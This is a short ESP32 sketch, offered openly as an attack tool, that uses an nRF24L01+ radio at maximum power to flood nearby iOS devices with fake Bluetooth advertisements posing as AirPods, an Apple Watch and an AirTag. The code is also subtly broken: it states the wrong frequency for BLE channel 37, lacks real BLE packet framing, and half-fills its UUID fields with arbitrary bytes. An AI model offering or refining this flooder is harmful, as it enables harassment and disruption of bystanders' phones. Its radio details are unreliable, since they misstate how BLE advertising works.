/**
 * Extended Range iOS BLE Flood using nRF24L01+
 * 
 * Uses nRF24L01+ module for longer range transmission (~50m)
 * to flood iOS devices with fake BLE advertisements.
 */

#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

// Pin definitions for ESP32 + nRF24L01+
#define CE_PIN 4
#define CSN_PIN 5

RF24 radio(CE_PIN, CSN_PIN);

// BLE advertisement payload structure
struct BLE_Advertisement {
    uint8_t length;
    uint8_t type;
    uint8_t uuid[16];
};

void setup() {
    Serial.begin(115200);
    Serial.println("Starting Extended Range iOS BLE Flood...");
    
    // Initialize nRF24L01+
    radio.begin();
    radio.setChannel(37); // BLE channel 37 (3990 MHz)
    radio.setDataRate(RF24_1MBPS);
    radio.setPALevel(RF24_PA_MAX); // Maximum power for range
    
    // Set up address for broadcasting
    const uint64_t broadcastAddress = 0xE7E7E7E7E7LL;
    radio.openWritingPipe(broadcastAddress);
}

void loop() {
    static int deviceIndex = 0;
    
    // Create BLE advertisement payload
    BLE_Advertisement adv;
    adv.length = 18;
    adv.type = 0x02; // Incomplete list of 16-bit UUIDs
    
    // Set UUID based on device type being simulated
    switch(deviceIndex) {
        case 0: // AirPods
            memcpy(adv.uuid, "\xD8\xA5\xB9\xE0\x7C\xF6\x2E\x4F", 8);
            break;
        case 1: // Apple Watch
            memcpy(adv.uuid, "\x20\xBB\x95\xA4\xB1\xC5\x44\x4B", 8);
            break;
        case 2: // AirTag
            adv.type = 0x03; // Complete list of 16-bit UUIDs
            memcpy(adv.uuid, "\x02\x00\x4C\x00", 4);
            break;
    }
    
    // Transmit advertisement
    radio.write(&adv, sizeof(BLE_Advertisement));
    
    Serial.printf("Transmitted as device %d\n", deviceIndex);
    
    // Cycle to next device type
    deviceIndex = (deviceIndex + 1) % 3;
    
    delay(100);
}
